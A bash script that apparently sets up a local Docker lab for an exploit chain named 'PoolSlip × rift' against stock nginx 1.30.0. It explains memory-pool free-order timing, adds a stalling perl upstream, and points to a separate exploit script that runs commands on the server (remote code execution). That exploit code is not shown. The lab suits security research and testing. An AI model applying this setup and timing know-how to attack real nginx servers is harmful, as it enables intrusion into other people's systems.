#!/usr/bin/env bash
# Local lab for the PoolSlip × rift chain.
#
# Stands up the STOCK official nginx:1.30.0 image (Debian 13, glibc 2.41 — the real release binary,
# untouched) serving ./nginx.conf on host :19322, plus a slow upstream so the rift request parks on
# it (instead of 502-ing and freeing its pool before the victim fires — destroy-order matters).
#
# Self-contained: the slow upstream is a perl one-liner (perl ships in the stock nginx image), so
# there's no extra file, no apt, no internet needed. exp_official.py targets 127.0.0.1:19322.
set -euo pipefail
NAME=nginx-rift-official
PORT="${1:-19322}"
HERE="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"

docker rm -f "$NAME" 2>/dev/null || true

# Override the image CMD with `nginx -c <conf>`: our nginx.conf already sets `daemon off`, so we must
# NOT let the image append its default `-g 'daemon off;'` (that would be a duplicate-directive error).
docker run -d --name "$NAME" \
    --cap-add=SYS_PTRACE --security-opt seccomp=unconfined \
    -p "${PORT}:80" \
    -v "$HERE/nginx.conf":/etc/nginx/nginx.conf:ro \
    nginx:1.30.0 nginx -c /etc/nginx/nginx.conf >/dev/null

# 'app' upstream (127.0.0.1:8080): accept, stall ~6 s, then 200. The stall keeps the rift request
# parked on the upstream so its pool is freed *after* the victim fires.
docker exec -d "$NAME" perl -MIO::Socket::INET -e '
  $SIG{CHLD}="IGNORE";
  my $s=IO::Socket::INET->new(LocalAddr=>"127.0.0.1",LocalPort=>8080,Listen=>128,ReuseAddr=>1) or die $!;
  while (my $c=$s->accept) { next if fork; my $b; sysread($c,$b,16384); sleep 6;
    print $c "HTTP/1.1 200 OK\r\nContent-Length: 3\r\nConnection: close\r\n\r\nok\n"; close $c; exit }'

sleep 2
if curl -s "http://127.0.0.1:${PORT}/healthz" | grep -q ok; then
    echo "[+] nginx 1.30.0 up on http://127.0.0.1:${PORT}  (perl app:8080; search_index:9200 offline)"
else
    echo "[!] health check failed — see 'docker logs $NAME'"
fi
echo "[+] exploit:  python3 exp_official.py --cmd 'id > /tmp/rce_proof'"
echo "[+] proof:    docker exec $NAME cat /tmp/rce_proof"
echo "[+] stop:     docker rm -f $NAME"
